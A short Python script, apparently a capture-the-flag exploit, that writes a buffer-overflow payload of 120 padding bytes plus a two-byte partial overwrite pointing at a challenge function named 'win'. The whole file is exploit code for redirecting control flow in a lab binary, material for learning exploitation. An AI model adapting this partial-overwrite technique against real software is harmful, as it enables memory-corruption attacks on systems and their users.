#!/usr/bin/env python3

from struct import pack

payload = b'\0' * 120

# The address of the function win
payload += pack("<H", 0x15e0)

with open("payload", "wb") as f:
    f.write(payload)